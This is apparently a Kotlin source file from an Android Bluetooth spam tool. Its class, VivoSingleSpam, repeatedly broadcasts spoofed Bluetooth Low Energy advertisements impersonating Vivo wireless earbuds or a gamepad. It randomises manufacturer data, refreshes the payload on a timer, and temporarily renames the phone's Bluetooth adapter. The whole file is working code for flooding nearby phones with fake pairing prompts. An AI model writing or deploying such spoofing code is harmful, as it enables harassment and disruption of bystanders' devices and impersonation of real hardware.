package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import android.os.ParcelUuid
import java.util.UUID
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class VivoSingleSpam(private val device: VivoDevice) : Spammer {

    private var isSpamming = false
    private var blinkRunnable: Runnable? = null
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val twsServiceUuid =
        ParcelUuid(UUID.fromString(VivoDevice.TWS_SERVICE_UUID))
    private val hidServiceUuid =
        ParcelUuid(UUID.fromString(VivoDevice.HID_SERVICE_UUID))
    private var originalBtName: String? = null
    private var btNameSaved = false

    private fun buildTwsData(): AdvertiseData {
        return AdvertiseData.Builder()
            .addManufacturerData(VivoDevice.COMPANY_ID, device.toRandomizedManufacturerData())
            .addServiceUuid(twsServiceUuid)
            .build()
    }

    override fun start() {
        executor.execute {
            isSpamming = true
            val advertiser = BluetoothAdvertiser()

            if (device.deviceType == VivoDevice.Type.GAMEPAD) {
                saveOriginalBtName()
                setBtName(device.localName.orEmpty())
                var waited = 0L
                while (waited < 600L && isSpamming) {
                    try {
                        Thread.sleep(100L)
                    } catch (_: InterruptedException) {
                        break
                    }
                    waited += 100L
                }
            }
            val gamepadData: AdvertiseData? = if (device.deviceType == VivoDevice.Type.GAMEPAD) {
                AdvertiseData.Builder()
                    .addServiceUuid(hidServiceUuid)
                    .setIncludeDeviceName(true)
                    .build()
            } else null

            try {
                if (device.deviceType == VivoDevice.Type.TWS) {
                    advertiser.advertise(buildTwsData(), null, forceLegacy = true, connectable = true)
                    blinkRunnable?.run()
                    var sinceRefresh = 0L
                    while (isSpamming) {
                        try {
                            Thread.sleep(Helper.delay.toLong())
                        } catch (_: InterruptedException) {
                            break
                        }
                        if (!isSpamming) break
                        sinceRefresh += Helper.delay
                        if (sinceRefresh >= VivoDevice.TWS_PAYLOAD_REFRESH_MS) {
                            advertiser.stopAdvertising()
                            advertiser.advertise(buildTwsData(), null, forceLegacy = true, connectable = true)
                            sinceRefresh = 0
                        }
                    }
                } else {
                    while (isSpamming) {
                        advertiser.advertise(gamepadData!!, null, forceLegacy = true, connectable = true)
                        blinkRunnable?.run()
                        try {
                            Thread.sleep(Helper.delay.toLong())
                        } catch (_: InterruptedException) {
                            break
                        }
                    }
                }
            } finally {
                advertiser.stopAdvertising()
                if (device.deviceType == VivoDevice.Type.GAMEPAD) {
                    restoreBtName()
                }
            }
        }
    }

    override fun stop() {
        isSpamming = false
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun setBlinkRunnable(runnable: Runnable?) {
        blinkRunnable = runnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    private fun saveOriginalBtName() {
        if (btNameSaved) return
        try {
            originalBtName = try { BluetoothHelper.bluetoothAdapter?.name } catch (_: SecurityException) { null }
            btNameSaved = true
        } catch (_: Exception) { }
    }

    private fun setBtName(name: String) {
        if (name.isEmpty()) return
        try {
            BluetoothHelper.bluetoothAdapter?.name = name
        } catch (_: SecurityException) { } catch (_: Exception) { }
    }

    private fun restoreBtName() {
        if (!btNameSaved) return
        try {
            val orig = originalBtName
            if (!orig.isNullOrEmpty()) {
                try { BluetoothHelper.bluetoothAdapter?.name = orig } catch (_: SecurityException) { }
            }
        } catch (_: Exception) { } finally {
            btNameSaved = false
        }
    }
}
